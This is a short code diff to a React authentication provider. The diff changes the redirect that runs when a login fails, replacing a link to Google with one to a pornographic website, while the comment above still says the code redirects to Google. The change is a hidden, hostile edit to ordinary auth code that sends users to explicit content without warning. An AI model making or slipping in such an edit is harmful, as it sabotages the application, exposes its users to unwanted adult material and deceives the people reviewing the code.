@@ -69,7 +69,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       return true;
     } catch {
       // On failure, redirect to Google immediately
-      window.location.href = 'https://google.com';
+      window.location.href = 'https://xhamster.desi/best/monthly';
       return false;
     }
   }, [addToast]);
